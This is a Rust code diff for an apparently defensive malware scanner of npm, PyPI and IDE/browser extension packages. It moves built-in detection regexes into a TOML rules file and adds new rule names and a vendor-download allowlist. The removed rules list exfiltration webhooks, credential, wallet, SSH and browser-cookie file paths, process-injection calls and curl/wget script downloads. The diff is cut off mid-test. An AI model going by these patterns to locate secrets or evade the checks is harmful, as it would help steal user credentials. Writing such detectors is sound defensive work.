@@ -12,7 +12,15 @@ const CRITICAL_EXTENSIONS: &[&str] = &[
 ];
 
 /// Critical filenames (exact match)
-const CRITICAL_FILENAMES: &[&str] = &["package.json", "setup.py", "manifest.json", "plugin.xml"];
+// `extension.vsixmanifest` carries the marketplace links; malicious
+// extensions point them at raw-IP C2 hosts.
+const CRITICAL_FILENAMES: &[&str] = &[
+    "package.json",
+    "setup.py",
+    "manifest.json",
+    "plugin.xml",
+    "extension.vsixmanifest",
+];
 
 /// Prose files: never executed, and READMEs routinely quote IOC strings that
 /// trip YARA. Skipped for the YARA-only pass on non-script files.
@@ -29,18 +37,114 @@ pub const OVERSIZED_FINDING: &str = "Oversized File (partially scanned)";
 pub const LOCAL_SERVER: &str = "Local Network Server";
 pub const UPLOAD_HANDLER: &str = "HTTP File Upload Handler";
 pub const ARCHIVE_EXTRACTION: &str = "Archive Extraction";
+pub const EXFIL_SERVICE: &str = "Exfiltration Service Endpoint";
+pub const IP_URL: &str = "Public IP URL";
+pub const IP_LOOKUP: &str = "IP Lookup Service";
+pub const HOST_RECON: &str = "Host Reconnaissance";
+pub const REMOTE_BINARY: &str = "Remote Executable Download";
+pub const SHELL_START: &str = "Shell Process Start";
+pub const RAW_SOCKET: &str = "Raw Socket Connection";
+pub const DETACHED_SPAWN: &str = "Detached Process Spawn";
+pub const MAKE_EXECUTABLE: &str = "Make File Executable";
+pub const OBFUSCATOR_IO: &str = "Obfuscator.io Output";
+pub const SEED_ACCESS: &str = "Wallet Seed / Private Key Handling";
+pub const INSTALL_HOOK_OVERRIDE: &str = "setup.py Install Hook Override";
+pub const SETUP_PY_EXEC: &str = "setup.py Install-time Execution";
+pub const SETUP_PY_STAGER: &str = "setup.py Payload Decode/Fetch";
+pub const DOWNLOAD_CRADLE: &str = "Download Cradle (fetch piped to interpreter)";
 
+#[derive(Clone, Debug)]
 pub struct Rule {
-    pub name: &'static str,
+    pub id: String,
+    pub name: String,
     pub pattern: Regex,
-    pub severity: &'static str,
-    #[allow(dead_code)]
-    pub description: &'static str,
-    pub category: &'static str,
+    pub severity: String,
+    pub description: String,
+    pub category: String,
+    /// File names this rule never runs on (e.g. npm metadata in package.json).
+    pub exclude_files: Vec<String>,
 }
+
+#[derive(serde::Deserialize)]
+struct RuleFile {
+    rule: Vec<RuleDef>,
+}
+
+#[derive(serde::Deserialize)]
+struct RuleDef {
+    id: String,
+    name: String,
+    severity: String,
+    category: String,
+    description: String,
+    pattern: String,
+    #[serde(default)]
+    matches: Vec<String>,
+    #[serde(default)]
+    ignores: Vec<String>,
+    #[serde(default)]
+    exclude_files: Vec<String>,
+}
+
+const SEVERITIES: &[&str] = &["critical", "high", "medium", "low"];
+
+/// Parse a rules TOML file (built-in or `--rules <file>`). Every rule must
+/// compile and agree with its own examples, so a broken custom rule fails
+/// the scan up front instead of silently matching nothing.
+pub fn parse_rules(toml_text: &str) -> anyhow::Result<Vec<Rule>> {
+    let file: RuleFile = toml::from_str(toml_text)?;
+    file.rule
+        .into_iter()
+        .map(|d| {
+            if !SEVERITIES.contains(&d.severity.as_str()) {
+                anyhow::bail!("rule {}: unknown severity '{}'", d.id, d.severity);
+            }
+            let pattern = Regex::new(&d.pattern)
+                .map_err(|e| anyhow::anyhow!("rule {} ({}): {}", d.id, d.name, e))?;
+            if let Some(m) = d.matches.iter().find(|m| !pattern.is_match(m)) {
+                anyhow::bail!(
+                    "rule {} ({}) does not match its example {:?}",
+                    d.id,
+                    d.name,
+                    m
+                );
+            }
+            if let Some(i) = d.ignores.iter().find(|i| pattern.is_match(i)) {
+                anyhow::bail!(
+                    "rule {} ({}) matches its ignore example {:?}",
+                    d.id,
+                    d.name,
+                    i
+                );
+            }
+            Ok(Rule {
+                id: d.id,
+                name: d.name,
+                pattern,
+                severity: d.severity,
+                description: d.description,
+                category: d.category,
+                exclude_files: d.exclude_files,
+            })
+        })
+        .collect()
+}
+
+pub fn load_rules_file(path: &Path) -> anyhow::Result<Vec<Rule>> {
+    let text = std::fs::read_to_string(path)
+        .map_err(|e| anyhow::anyhow!("cannot read rules file {}: {}", path.display(), e))?;
+    parse_rules(&text).map_err(|e| anyhow::anyhow!("{}: {}", path.display(), e))
+}
+
+static BUILTIN_RULES: std::sync::LazyLock<Vec<Rule>> = std::sync::LazyLock::new(|| {
+    parse_rules(include_str!("../rules/builtin.toml")).expect("rules/builtin.toml is valid")
+});
 
 impl Rule {
     pub fn applies_to(&self, ext: &str, filename: &str) -> bool {
+        if self.exclude_files.iter().any(|f| f == filename) {
+            return false;
+        }
         if self.category == "obfuscation" {
             return true;
         }
@@ -50,467 +154,17 @@ impl Rule {
         if self.category == "file_access" {
             return CRITICAL_EXTENSIONS.contains(&ext);
         }
+        // Code in setup.py runs at `pip install` time; elsewhere these calls are ordinary.
+        if self.category == "install_hook" {
+            return filename == "setup.py";
+        }
         true
     }
 }
 
-/// Build static analysis rules.
-/// Uses `boxed_regex` via `Regex::new().unwrap()` at startup — compiled once.
+/// Built-in rules from `rules/builtin.toml`, parsed and compiled once.
 pub fn build_rules() -> Vec<Rule> {
-    vec![
-        // ============================================================
-        // EXFILTRATION ENDPOINTS
-        // ============================================================
-        Rule {
-            name: "Discord Webhook",
-            pattern: Regex::new(r"discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]{30,}").unwrap(),
-            severity: "critical",
-            description: "Discord webhook URL — data exfiltration",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Telegram Bot API Token",
-            pattern: Regex::new(r"(?:https?://)?api\.telegram\.org/bot\d{8,10}:[a-zA-Z0-9_-]{35,40}/").unwrap(),
-            severity: "critical",
-            description: "Telegram Bot API token — C2/exfiltration channel",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Slack Webhook",
-            pattern: Regex::new(r"hooks\.slack\.com/services/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+/[a-zA-Z0-9_]+").unwrap(),
-            severity: "high",
-            description: "Slack webhook URL — potential data exfiltration",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Hardcoded IP Address",
-            pattern: Regex::new(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b").unwrap(),
-            severity: "medium",
-            description: "Hardcoded IP address — potential C2 server",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "AWS Access Key",
-            pattern: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
-            severity: "critical",
-            description: "AWS Access Key ID detected — credential leak",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "AWS Secret Key",
-            pattern: Regex::new(r#"(?i)(?:aws_secret_access_key|secretAccessKey)\s*[:=]\s*['"][a-zA-Z0-9/+=]{40}['"]"#).unwrap(),
-            severity: "critical",
-            description: "AWS Secret Access Key detected — credential leak",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "GitHub Token",
-            pattern: Regex::new(r"ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{22,}").unwrap(),
-            severity: "critical",
-            description: "GitHub token detected — credential leak",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Generic API Key",
-            pattern: Regex::new(r#"(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*['"][a-zA-Z0-9_-]{16,}['"]"#).unwrap(),
-            severity: "high",
-            description: "Generic API key or secret detected",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Generic Webhook URL",
-            pattern: Regex::new(r"https?://[a-zA-Z0-9.-]+/webhook(?:s)?/").unwrap(),
-            severity: "medium",
-            description: "Generic webhook URL — potential exfiltration endpoint",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Slack Bot Token",
-            pattern: Regex::new(r"xox[baprs]-[0-9a-zA-Z-]{10,}").unwrap(),
-            severity: "high",
-            description: "Slack bot token detected — credential leak",
-            category: "exfiltration",
-        },
-
-        // ============================================================
-        // SENSITIVE DATA ACCESS
-        // ============================================================
-        Rule {
-            name: "Browser Profile Access",
-            pattern: Regex::new(r"(?i)(?:/AppData/Local/(?:Google/)?Chrome|/AppData/Roaming/Discord|Mozilla/Firefox/Profiles)").unwrap(),
-            severity: "critical",
-            description: "Browser profile/user data access — credential theft",
-            category: "file_access",
-        },
-        Rule {
-            name: "Crypto Wallet Access",
-            // Wallet data dirs and wallet browser-extension IDs; bare words like
-            // "wallet"/"phantom" matched PhantomJS polyfills in every Vue bundle.
-            pattern: Regex::new(r#"(?i)(?:wallet\.dat|["'\\/]\.(?:bitcoin|ethereum|electrum)\b|Ethereum[\\/]keystore|exodus\.wallet|Local Extension Settings|nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|ejbalbakoplchlghecdalmeeeajnimhm)"#).unwrap(),
-            severity: "critical",
-            description: "Crypto wallet access — crypto theft indicator",
-            category: "file_access",
-        },
-        Rule {
-            name: "Password Manager Access",
-            pattern: Regex::new(r#"(?i)(?:passwords?\.txt|passwd|credentials\.dat|login\.json|\.npmrc|(?:^|[\\/"'])[.]env\b)"#).unwrap(),
-            severity: "high",
-            description: "Credential file access detected",
-            category: "file_access",
-        },
-        Rule {
-            name: "Browser Database Access",
-            // File names inside a browser profile; bare "Cookies" matched every
-            // `_canUseCookies` / `disableCookies` identifier in telemetry SDKs.
-            pattern: Regex::new(r#"(?i:["'/\\](?:Login Data|Web Data|Local State)["'/\\]|cookies\.sqlite|logins\.json|key4\.db)|(?:Network|Default)[\\/]Cookies\b"#).unwrap(),
-            severity: "high",
-            description: "Browser database — session/cookie theft",
-            category: "file_access",
-        },
-        Rule {
-            name: "Discord Token Harvesting",
-            pattern: Regex::new(r#"(?i)(?:Discord[\\/]Local Storage[\\/]leveldb|discord\.ptb|discord\.canary)"#).unwrap(),
-            severity: "critical",
-            description: "Discord token file access — account theft",
-            category: "file_access",
-        },
-        Rule {
-            name: "SSH Key Access",
-            pattern: Regex::new(r"(?i)(?:/\.ssh/|id_rsa|id_dsa|authorized_keys|known_hosts)").unwrap(),
-            severity: "high",
-            description: "SSH key access — unauthorized access risk",
-            category: "file_access",
-        },
-        Rule {
-            name: "Environment Variable Dump",
-            pattern: Regex::new(r"(?i)(?:os\.environ|process\.env|getenv\b)").unwrap(),
-            severity: "medium",
-            description: "Environment variable access — may contain secrets",
-            category: "file_access",
-        },
-
-        // ============================================================
-        // OBFUSCATION & DYNAMIC EXECUTION
-        // ============================================================
-        Rule {
-            name: "eval() Usage",
-            // Not `obj.eval(`; the regex crate has no look-behind, so the
-            // preceding char is part of the match.
-            pattern: Regex::new(r"(?m)(?:^|[^.\w$\n])eval\s*\(").unwrap(),
-            severity: "high",
-            description: "eval() — arbitrary code execution risk",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "exec() Usage",
-            // Not `re.exec(` (JS RegExp), which is in nearly every bundle.
-            pattern: Regex::new(r"(?m)(?:^|[^.\w$\n])exec\s*\(").unwrap(),
-            severity: "high",
-            description: "exec() — arbitrary code execution risk",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "b64decode + exec Chain",
-            pattern: Regex::new(r"(?i)(?:base64\.b64decode|b64decode|from_base64).*(?:exec|eval|run)").unwrap(),
-            severity: "critical",
-            description: "Base64 decode + exec/eval chain — obfuscation",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "nested b64decode",
-            pattern: Regex::new(r"(?i)(?:base64\.b64decode\s*\(\s*base64|b64decode\s*\(\s*b64decode)").unwrap(),
-            severity: "critical",
-            description: "Nested base64 decoding — multi-layer obfuscation",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "child_process (Node.js)",
-            pattern: Regex::new(r"(?:child_process\.exec|child_process\.execSync|child_process\.spawn)").unwrap(),
-            severity: "high",
-            description: "child_process — command injection or payload execution",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "subprocess (Python)",
-            pattern: Regex::new(r"(?:subprocess\.(?:call|Popen|run|check_output|getoutput|check_call))").unwrap(),
-            severity: "high",
-            description: "subprocess — command execution or payload",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "os.system",
-            pattern: Regex::new(r"os\.system\s*\(").unwrap(),
-            severity: "high",
-            description: "os.system() — shell command execution",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "PowerShell Encoded Command",
-            pattern: Regex::new(r"(?i)(?:-EncodedCommand\s+[a-zA-Z0-9+/=]{50,}|powershell\s+.*-enc\b)").unwrap(),
-            severity: "critical",
-            description: "PowerShell encoded command — obfuscated execution",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Base64 Overuse",
-            pattern: Regex::new(r#"(?i)(?:from\s+base64\s+import|import\s+base64|require\(.base64.\))"#).unwrap(),
-            severity: "medium",
-            description: "Base64 module import — possible obfuscation",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Dynamic Import/Load",
-            pattern: Regex::new(r#"(?i)(?:__import__\(|importlib|execScript|new Function)"#).unwrap(),
-            severity: "medium",
-            description: "Dynamic code loading — potential backdoor",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Hex Encoding",
-            // 16+ consecutive escapes: short runs are regex char classes and
-            // byte constants in every library.
-            pattern: Regex::new(r"(?i)(?:\\x[0-9a-f]{2}){16,}").unwrap(),
-            severity: "high",
-            description: "Hex-encoded string sequence — obfuscated content",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "XOR Decode Pattern",
-            pattern: Regex::new(r"(?i)(?:ord\(.[^)]+.\)\s*\^\s*|charCodeAt\(.[^)]+.\)\s*\^\s*)").unwrap(),
-            severity: "high",
-            description: "XOR decoding — obfuscation technique",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Long Encoded String",
-            pattern: Regex::new(r#"[a-zA-Z0-9+/=]{200,}"#).unwrap(),
-            severity: "medium",
-            description: "Very long encoded string — potential payload",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "os.popen",
-            pattern: Regex::new(r"os\.popen\s*\(").unwrap(),
-            severity: "high",
-            description: "os.popen() — shell command execution",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Process Injection",
-            pattern: Regex::new(r"(?i)(?:VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread)").unwrap(),
-            severity: "critical",
-            description: "Windows process injection API calls — malware indicator",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Reflective DLL Loading",
-            // LoadLibraryA/GetProcAddress are in every native binding; static
-            // triage already reports them as imports.
-            pattern: Regex::new(r"ReflectiveLoader").unwrap(),
-            severity: "critical",
-            description: "Reflective DLL loading — code injection technique",
-            category: "obfuscation",
-        },
-
-        // ============================================================
-        // RANSOMWARE / DESTRUCTIVE
-        // ============================================================
-        Rule {
-            name: "Mass File Encryption",
-            pattern: Regex::new(r"(?i)(?:encrypt_file|encrypt_all|cipher\.encrypt|\.encrypt\s*\(|fernet\b.*encrypt)").unwrap(),
-            severity: "critical",
-            description: "File encryption function — potential ransomware",
-            category: "ransomware",
-        },
-        Rule {
-            name: "Shadow Copy Deletion",
-            pattern: Regex::new(r"(?i)(?:vssadmin|wmic shadowcopy|bcdedit|bootsect|recovery\s+mode)").unwrap(),
-            severity: "critical",
-            description: "Shadow copy/backup deletion — ransomware indicator",
-            category: "ransomware",
-        },
-        Rule {
-            name: "Encrypted File Extension",
-            // Quoted extension literal only: `.encoder` / `.encrypt(` are not file names.
-            pattern: Regex::new(r#"(?i)["'`]\.(?:enc(?:rypted)?|locked|crypted|crypt|cry)["'`]"#).unwrap(),
-            severity: "high",
-            description: "Encrypted file extension — ransomware victim pattern",
-            category: "ransomware",
-        },
-        Rule {
-            name: "Ransom Note",
-            pattern: Regex::new(r"(?i)(?:ransom(?:note|ware)|how_to_decrypt|readme_decrypt|your_files|your_data\b|pay\s+\d+\s+btc)").unwrap(),
-            severity: "critical",
-            description: "Ransom note text — ransomware indicator",
-            category: "ransomware",
-        },
-        Rule {
-            name: "Bitcoin Payment Address",
-            pattern: Regex::new(r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b").unwrap(),
-            severity: "high",
-            description: "Bitcoin address — potential ransom payment",
-            category: "ransomware",
-        },
-
-        // ============================================================
-        // SUPPLY CHAIN ATTACK
-        // ============================================================
-        Rule {
-            name: "Post-Install Script",
-            pattern: Regex::new(r#"(?i)"postinstall"\s*:\s*"|"preinstall"\s*:\s*""#).unwrap(),
-            severity: "high",
-            description: "npm postinstall/preinstall — supply chain attack vector",
-            category: "supply_chain",
-        },
-        // Typo-squats are found by edit distance in `cve::typosquat_matches`;
-        // the old regex here listed the legitimate package names.
-        Rule {
-            name: LOCAL_SERVER,
-            pattern: Regex::new(r#"(?:\bexpress\s*\(\s*\)|\b(?:http|https|net)\.createServer\s*\(|\bHTTPServer\s*\(|socketserver\.TCPServer|\.run\s*\(\s*host\s*=\s*["']0\.0\.0\.0)"#).unwrap(),
-            severity: "medium",
-            description: "Starts a network listener — reachable by other hosts or by web pages via CSRF",
-            category: "network",
-        },
-        Rule {
-            name: UPLOAD_HANDLER,
-            pattern: Regex::new(r"(?:\bmulter\s*\(|\bformidable\s*\(|\bbusboy\b|\bupload\.(?:single|array|fields)\s*\()").unwrap(),
-            severity: "medium",
-            description: "Accepts file uploads over HTTP",
-            category: "network",
-        },
-        Rule {
-            name: ARCHIVE_EXTRACTION,
-            pattern: Regex::new(r"(?:\bzip\.files\b|\.entryName\b|\bentry\.fileName\b|\.extractAllTo\s*\(|\.extractall\s*\(|\btarfile\.open\s*\(|\bzipfile\.ZipFile\s*\()").unwrap(),
-            severity: "medium",
-            description: "Extracts archive entries to disk",
-            category: "file_write",
-        },
-        Rule {
-            name: "Remote Script Download",
-            pattern: Regex::new(r#"(?i)(?:curl\s+-s(?:SL)?\s+https?://|wget\s+-q\s+https?://)\S+\.(?:ps1|sh|bat|py)\b"#).unwrap(),
-            severity: "high",
-            description: "Remote script download — payload delivery",
-            category: "supply_chain",
-        },
-        Rule {
-            name: "URL Fetch Command",
-            pattern: Regex::new(r"(?i)(?:Invoke-WebRequest|curl\b|wget\b|fetch\(|axios\.get|request\.get)").unwrap(),
-            severity: "medium",
-            description: "URL fetching — possible external payload download",
-            category: "supply_chain",
-        },
-        Rule {
-            name: "Hidden Directory Script",
-            pattern: Regex::new(r"(?i)[\\/]\.\w+[\\/](?:install|setup|config)").unwrap(),
-            severity: "medium",
-            description: "Script in hidden directory — suspicious",
-            category: "supply_chain",
-        },
-
-        // ============================================================
-        // VS CODE EXTENSION / IDE PLUGIN SECURITY
-        // ============================================================
-        Rule {
-            name: "VS Code Session/Token Stealing",
-            pattern: Regex::new(r"(?i)vscode\.authentication\.getSession\s*\(").unwrap(),
-            severity: "critical",
-            description: "Accessing VS Code authentication session — token theft indicator",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "VS Code Clipboard Harvesting",
-            pattern: Regex::new(r"(?i)vscode\.env\.clipboard\.readText\s*\(").unwrap(),
-            severity: "high",
-            description: "Reading clipboard contents silently in extension",
-            category: "file_access",
-        },
-        Rule {
-            name: "VS Code Workspace File Reading",
-            pattern: Regex::new(r"(?i)vscode\.workspace\.fs\.readFile\s*\(").unwrap(),
-            severity: "medium",
-            description: "Reading workspace files via VS Code API",
-            category: "file_access",
-        },
-        Rule {
-            name: "Installed Extension Tampering",
-            pattern: Regex::new(r#"(?i)[\\/]\.vscode[\\/]extensions[\\/]"#).unwrap(),
-            severity: "critical",
-            description: "References another installed extension's directory — supply-chain tampering",
-            category: "supply_chain",
-        },
-        Rule {
-            name: "VS Code Wildcard Activation",
-            pattern: Regex::new(r#"(?i)"activationEvents"\s*:\s*\[[^\]]*["'](?:\*|onStartupFinished)["']"#).unwrap(),
-            severity: "medium",
-            description: "Extension executes automatically on startup without user trigger",
-            category: "supply_chain",
-        },
-
-        // ============================================================
-        // JETBRAINS PLUGIN MALWARE RULES
-        // ============================================================
-        Rule {
-            name: "JetBrains Dynamic Classloading",
-            pattern: Regex::new(r"(?i)(?:URLClassLoader|ClassLoader\.defineClass|DexClassLoader)\s*\(").unwrap(),
-            severity: "critical",
-            description: "Dynamic Java/Kotlin classloader — payload injection indicator",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "JetBrains Process Execution",
-            pattern: Regex::new(r"(?i)(?:Runtime\.getRuntime\(\)\.exec|ProcessBuilder)\s*\(").unwrap(),
-            severity: "high",
-            description: "Executing OS processes from plugin code",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "JetBrains Malicious Reflection",
-            pattern: Regex::new(r"(?i)(?:Method\.invoke|Field\.setAccessible)\s*\(").unwrap(),
-            severity: "medium",
-            description: "Java reflection to bypass access control or security managers",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "JetBrains Raw Socket Exfiltration",
-            pattern: Regex::new(r"(?i)java\.net\.(?:Socket|HttpURLConnection|URL)\s*").unwrap(),
-            severity: "medium",
-            description: "Raw networking call for beaconing or exfiltration",
-            category: "exfiltration",
-        },
-
-        // ============================================================
-        // CHROME / BROWSER EXTENSION MALWARE RULES
-        // ============================================================
-        Rule {
-            name: "Browser Extension Dangerous Permissions",
-            pattern: Regex::new(r#"(?i)"(?:permissions|optional_permissions)"\s*:\s*\[[^\]]*["'](?:\*://\*|<all_urls>|webRequestBlocking|debugger|nativeMessaging)["']"#).unwrap(),
-            severity: "high",
-            description: "High-risk browser extension permission targeting all network traffic or debugging",
-            category: "supply_chain",
-        },
-        Rule {
-            name: "Browser Extension Dynamic Code Execution",
-            // `unsafe-eval` only matters inside a manifest CSP, not in a warning string.
-            pattern: Regex::new(r#"(?i)(?:chrome\.tabs\.executeScript|"content_security_policy"[^\n]*unsafe-eval)"#).unwrap(),
-            severity: "high",
-            description: "Dynamic script injection or CSP unsafe-eval in extension",
-            category: "obfuscation",
-        },
-        Rule {
-            name: "Browser Extension Keystroke Logger",
-            pattern: Regex::new(r#"(?i)addEventListener\s*\(\s*["']key(?:down|press|up)["']"#).unwrap(),
-            severity: "high",
-            description: "Key event listener indicating potential keylogger",
-            category: "exfiltration",
-        },
-        Rule {
-            name: "Browser Extension Cookie/Token Theft",
-            pattern: Regex::new(r"(?i)chrome\.(?:cookies\.getAll|storage\.local\.get)").unwrap(),
-            severity: "high",
-            description: "Harvesting browser cookies or local extension storage",
-            category: "file_access",
-        },
-    ]
+    BUILTIN_RULES.clone()
 }
 
 pub fn is_critical_file(filename: &str) -> bool {
@@ -536,9 +190,11 @@ pub fn get_extension(filename: &str) -> &str {
 pub fn scan_directory_filtered<P: AsRef<Path>>(
     dir: P,
     custom_yara_dir: Option<&Path>,
+    extra_rules: &[Rule],
     changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
 ) -> (usize, usize, Vec<RuleMatch>) {
-    let rules = build_rules();
+    let mut rules = build_rules();
+    rules.extend_from_slice(extra_rules);
     let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
     let mut matches = Vec::new();
     let mut total_files = 0usize;
@@ -620,8 +276,6 @@ pub fn scan_directory_filtered<P: AsRef<Path>>(
             matches.extend(handle.join().unwrap_or_default());
         }
     });
-    let chains = crate::correlate::correlate_package(&matches);
-    matches.extend(chains);
 
     (total_files, scanned_files, matches)
 }
@@ -696,6 +350,8 @@ fn scan_files(
         }
 
         let file_start = matches.len();
+        // Byte offset per finding of this file, for chain proximity checks.
+        let mut offsets: Vec<usize> = Vec::new();
         let newlines: Vec<usize> = content.match_indices('\n').map(|(i, _)| i).collect();
         let ext = get_extension(filename);
 
@@ -710,10 +366,17 @@ fn scan_files(
                 {
                     continue;
                 }
-                if rule.name == "Hardcoded IP Address" && !is_public_ipv4(cap.as_str()) {
+                let is_ip_rule = rule.name == "Hardcoded IP Address" || rule.name == IP_URL;
+                let ip_text = cap.as_str().rsplit('/').next().unwrap_or_default();
+                if is_ip_rule && !is_public_ipv4(ip_text) {
+                    continue;
+                }
+                let is_download_rule = rule.name == REMOTE_BINARY || rule.name == DOWNLOAD_CRADLE;
+                if is_download_rule && is_vendor_download(cap.as_str()) {
                     continue;
                 }
                 let context = get_context(&content, cap.start(), cap.end());
+                offsets.push(cap.start());
 
                 matches.push(RuleMatch {
                     file_path: rel_path.clone(),
@@ -738,10 +401,57 @@ fn scan_files(
         let yara_matches = yara_engine.scan_data(rel_path, content.as_bytes());
         matches.extend(yara_matches);
 
-        let chains = crate::correlate::correlate_file(rel_path, &content, &matches[file_start..]);
+        // Entropy / YARA hits only know their line: use the line start.
+        let line_start = |line: usize| match line {
+            0 | 1 => 0,
+            n => newlines.get(n - 2).map_or(0, |&i| i + 1),
+        };
+        for m in &matches[file_start + offsets.len()..] {
+            offsets.push(line_start(m.line_number));
+        }
+        let chains =
+            crate::correlate::correlate_file(rel_path, &content, &matches[file_start..], &offsets);
         matches.extend(chains);
     }
     matches
+}
+
+/// Official vendor download / installer hosts: Playwright fetching Chrome
+/// from dl.google.com, the Python extension running astral.sh's uv
+/// installer. Not GitHub, Drive or OneDrive: attackers host payloads there.
+fn is_vendor_download(url: &str) -> bool {
+    const VENDORS: &[&str] = &[
+        "dl.google.com",
+        "astral.sh",
+        "sh.rustup.rs",
+        "get.docker.com",
+        "deno.land",
+        "bun.sh",
+        "install.python-poetry.org",
+        "get.pnpm.io",
+        "pyenv.run",
+        "microsoft.com",
+        "aka.ms",
+        "visualstudio.com",
+        "nodejs.org",
+        "python.org",
+        "mozilla.org",
+        "mozilla.net",
+        "docker.com",
+        "playwright.dev",
+        "apple.com",
+    ];
+    let Some(host) = url
+        .split("://")
+        .nth(1)
+        .and_then(|rest| rest.split(['/', ':', '?']).next())
+    else {
+        return false;
+    };
+    let host = host.to_ascii_lowercase();
+    VENDORS
+        .iter()
+        .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
 }
 
 /// Loopback, private, link-local and version-like invalid quads are not C2.
@@ -822,8 +532,8 @@ mod tests {
         .unwrap();
         std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();
 
-        let (total, scanned, mut first) = scan_directory_filtered(dir.path(), None, None);
-        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, None);
+        let (total, scanned, mut first) = scan_directory_filtered(dir.path(), None, &[], None);
+        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None);
 
         let key = |m: &RuleMatch| {
             (
@@ -864,7 +574,7 @@ mod tests {
         )
         .unwrap();
 
-        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, None);
+        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None);
         assert_eq!((total, scanned), (4, 2));
         assert!(!matches.iter().any(|m| m.file_path == "README.md"));
         let has = |file: &str, rule: &str| {
@@ -881,75 +591,104 @@ mod tests {
         assert!(has("payload.bin", "YARA Rule: ReverseShellGeneric"));
     }
 
-    /// Every negative below is a real false positive from a clean VSIX.
+    /// Rule examples (`matches` / `ignores` in rules/builtin.toml) are
+    /// checked by `parse_rules`; this also pins ids, names and the names
+    /// correlate.rs keys on.
     #[test]
-    fn test_noisy_rules_ignore_library_code() {
-        let rules = build_rules();
-        let rule = |name: &str| &rules.iter().find(|r| r.name == name).unwrap().pattern;
-        let cases: &[(&str, &str, bool)] = &[
-            ("Crypto Wallet Access", "e.g., PhantomJS 1.x", false),
-            (
-                "Crypto Wallet Access",
-                r#"path.join(home, ".ethereum", "keystore")"#,
-                true,
-            ),
-            (
-                "Crypto Wallet Access",
-                "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
-                true,
-            ),
-            (
-                "Browser Database Access",
-                "var cookies = require('./../helpers/cookies');",
-                false,
-            ),
-            (
-                "Browser Database Access",
-                "U={_canUseCookies:void 0,disableCookies:P}",
-                false,
-            ),
-            (
-                "Browser Database Access",
-                r#"path.join(profile, "Login Data")"#,
-                true,
-            ),
-            ("Browser Database Access", r"Default\Network\Cookies", true),
-            ("exec() Usage", "while ((match = tagRE.exec(text)))", false),
-            ("exec() Usage", "exec(code, ns, ns)", true),
-            ("eval() Usage", "window.eval(x)", false),
-            (
-                "Encrypted File Extension",
-                "return this.encoder.write(e)",
-                false,
-            ),
-            ("Encrypted File Extension", "file + '.locked'", true),
-            (
-                "Reflective DLL Loading",
-                "GetProcAddress(h, \"Foo\")",
-                false,
-            ),
-            ("Hex Encoding", r"/^[\x20\x09\x0a\x0d]*(.)/", false),
-            ("Hex Encoding", &r"\x41".repeat(16), true),
-            (
-                "Browser Extension Dynamic Code Execution",
-                "warn('prohibits unsafe-eval')",
-                false,
-            ),
-            (
-                "Browser Extension Dynamic Code Execution",
-                r#""content_security_policy": "script-src 'self' 'unsafe-eval'""#,
-                true,
-            ),
-        ];
-        for (name, text, expected) in cases {
-            assert_eq!(
-                rule(name).is_match(text),
-                *expected,
-                "{} on {:?}",
-                name,
-                text
+    fn test_builtin_rules_load_and_are_consistent() {
+        let rules = parse_rules(include_str!("../rules/builtin.toml")).unwrap();
+        let ids: std::collections::HashSet<_> = rules.iter().map(|r| r.id.as_str()).collect();
+        let names: std::collections::HashSet<_> = rules.iter().map(|r| r.name.as_str()).collect();
+        assert_eq!(ids.len(), rules.len(), "duplicate rule id");
+        assert_eq!(names.len(), rules.len(), "duplicate rule name");
+        for name in [
+            LOCAL_SERVER,
+            UPLOAD_HANDLER,
+            ARCHIVE_EXTRACTION,
+            EXFIL_SERVICE,
+            IP_URL,
+            IP_LOOKUP,
+            HOST_RECON,
+            REMOTE_BINARY,
+            SHELL_START,
+            RAW_SOCKET,
+            DETACHED_SPAWN,
+            MAKE_EXECUTABLE,
+            OBFUSCATOR_IO,
+            SEED_ACCESS,
+            INSTALL_HOOK_OVERRIDE,
+            SETUP_PY_EXEC,
+            SETUP_PY_STAGER,
+            DOWNLOAD_CRADLE,
+            "Hardcoded IP Address",
+            "Post-Install Script",
+            "URL Fetch Command",
+        ] {
+            assert!(
